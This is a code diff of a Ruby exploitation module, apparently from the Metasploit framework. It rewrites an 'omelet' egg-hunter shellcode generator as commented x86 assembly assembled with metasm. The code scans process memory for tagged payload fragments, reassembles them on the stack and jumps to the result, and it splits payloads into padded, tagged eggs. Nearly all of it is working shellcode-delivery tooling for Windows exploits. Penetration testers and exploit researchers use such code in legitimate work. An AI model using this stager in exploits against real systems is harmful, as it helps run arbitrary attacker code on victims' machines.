@@ -1,5 +1,7 @@
 require 'rex/text'
 require 'rex/arch'
+require 'metasm'
+
 
 module Rex
 module Exploitation
@@ -89,66 +91,120 @@ class Omelet
 				nr_eggs = nr_eggs+1
 			end
 
+			nr_eggs_hex = "%02x" % nr_eggs
+			eggsize_hex = "%02x" % eggsize
+
+			hextag = ""
+			eggtag.split('').each do | thischar |
+				decchar = "%02x" % thischar[0]
+				hextag = decchar + hextag
+			end
+			hextag = hextag + "01"
+
 			# create omelet code
 
-			the_omelet = "\xeb\x24" +
-				"\x54\x5f" +
-				"\x66\x81\xcf\xff\xff" +
-				"\x89\xfa" +
-				"\x31\xc0" +
-				"\xb0" + nr_eggs.chr +
-				"\x31\xf6" +
-				"\x66\xbe" + (237-eggsize).chr + "\xff" +
-				"\x4f\x46" +
-				"\x66\x81\xfe\xff\xff" +
-				"\x75\xf7" +
-				"\x48" +
-				"\x75\xee" +
-				"\x31\xdb" +
-				"\xb3" + (nr_eggs+1).chr +
-				"\xc3" +
-				"\xe8\xd7\xff\xff\xff" +
-				"\xeb\x04" +
-				"\x4a\x4a\x4a\x4a" +
-				"\x42" +
-				"\x52" +
-				"\x6a\x02" +
-				"\x58" +
-				"\xcd\x2e" +
-				"\x3c\x05" +
-				"\x5a" +
-				"\x74\xf4" +
-				"\xb8\x01" + eggtag +
-				"\x01\xd8" +
-				"\x87\xfa" +
-				"\xaf" +
-				"\x87\xfa" +
-				"\x75\xe2" +
-				"\x89\xd6" +
-				"\x31\xc9" +
-				"\xb1"  + eggsize.chr +
-				"\xf3\xa4" +
-				"\x4b" +
-				"\x80\xfb\x01" +
-				"\x75\xd4" +
-				"\xe8\xa4\xff\xff\xff" +
-				"\xff\xe7"
+			omelet_hunter = <<EOS
 
+	nr_eggs equ 0x#{nr_eggs_hex}	; number of eggs
+	egg_size equ 0x#{eggsize_hex} 	; nr bytes of payload per egg
+	hex_tag equ 0x#{hextag}		; tag
+	
+	jmp start
+	
+	; routine to calculate the target location 
+	; for writing recombined shellcode (omelet)
+	; I'll use EDI as target location
+	; First, I'll make EDI point to end of stack
+	; and I'll put the number of shellcode eggs in eax
+get_target_loc:
+	push esp		   ; get stack pointer and put it in EDI
+	pop edi        ; set EDI to end of stack
+	or di,0xffff	; edi=0x....ffff = end of current stack frame
+	mov edx,edi		; use edx as start location for the search
+	xor eax,eax		; zero eax
+	mov al,nr_eggs	; put number of eggs in eax
+	
+calc_target_loc:
+	xor esi,esi		; use esi as counter to step back
+	mov si,0-(egg_size+20)	; add 20 bytes of extra space, per egg
+	
+get_target_loc_loop:	; start loop
+	dec edi		; step back
+	inc esi		; and update ESI counter
+	cmp si,-1	; continue to step back until ESI = -1
+	jnz get_target_loc_loop
+	dec eax		; loop again if we did not take all pieces
+               ; into account yet
+	jnz calc_target_loc
+
+	; edi now contains target location 
+	; for recombined shellcode
+	xor ebx,ebx		; put loop counter in ebx
+	mov bl,nr_eggs+1
+	ret
+	
+start:
+	call get_target_loc	; jump to routine which will calculate shellcode dst address
+	
+	; start looking for eggs, using edx as basepointer
+	jmp search_next_address
+	
+find_egg:
+	dec edx	 ; scasd does edx+4, so dec edx 4 times
+	          ; + inc edx one time
+				 ; to make sure we don't miss any pointers
+	dec edx
+	dec edx
+	dec edx
+	
+search_next_address:
+	inc edx		; next ptr 
+	push edx		; save edx
+	push 0x02
+	pop eax		; set eax to 0x02
+	int 0x2e
+	cmp al,0x5		; address readable ?
+	pop edx		; restore edx
+	je search_next_address  ; if addressss is not readable, go to next address
+
+	mov eax,hex_tag	; if address is readable, prepare tag in eax
+	add eax,ebx		; add offset (ebx contains egg counter, remember ?)
+	xchg edi,edx		; switch edx/edi
+	scasd			; edi points to the tag ? 
+	xchg edi,edx		; switch edx/edi back
+	jnz find_egg		; if tag was not found, go to next address
+	;found the tag at edx
+
+copy_egg:
+	; ecx must first be set to egg_size (used by rep instruction) and esi as source
+	mov esi,edx		; set ESI = EDX (needed for rep instruction)
+	xor ecx,ecx
+	mov cl,egg_size	; set copy counter
+	rep movsb		; copy egg from ESI to EDI
+	dec ebx		; decrement egg
+	cmp bl,1		; found all eggs ?
+	jnz find_egg		; no = look for next egg
+	; done - all eggs have been found and copied
+	
+done:
+	call get_target_loc	; re-calculate location where recombined shellcode is placed
+	jmp edi		; and jump to it :)
+EOS
+
+			the_omelet = Metasm::Shellcode.assemble(Metasm::Ia32.new, omelet_hunter).encode_string
 
 			# create the eggs array
 
 			eggs = Array.new(nr_eggs)
 			total_size = eggsize * nr_eggs
 			padlen = total_size - payloadlen
-			#print("Padlen : #{padlen}")
-			payloadpadding = ""
-			if padlen > 0
-				payloadpadding = "A" * padlen
-			end
-			fullcode = payload+payloadpadding
-			eggcnt = nr_eggs+2
+			payloadpadding = "A" * padlen
+
+			fullcode = payload + payloadpadding
+			eggcnt = nr_eggs + 2
 			startcode = 0
 			arraycnt = 0
+
 			while eggcnt > 2 do
 				egg_prep = eggcnt.chr + eggtag
 				this_egg = fullcode[startcode, eggsize]
